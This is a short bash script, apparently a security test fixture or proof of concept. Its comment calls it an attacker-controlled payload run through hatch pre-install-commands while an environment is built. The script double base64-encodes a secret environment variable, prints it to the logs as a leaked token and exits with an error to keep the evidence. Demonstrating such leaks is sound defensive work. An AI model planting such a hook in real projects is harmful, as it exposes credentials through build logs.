#!/bin/bash
set -v
set -x
set -e
# Attacker-controlled payload executed by hatch pre-install-commands during env creation
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
# terminate explicitly so the logs preserve the evidence
exit 1
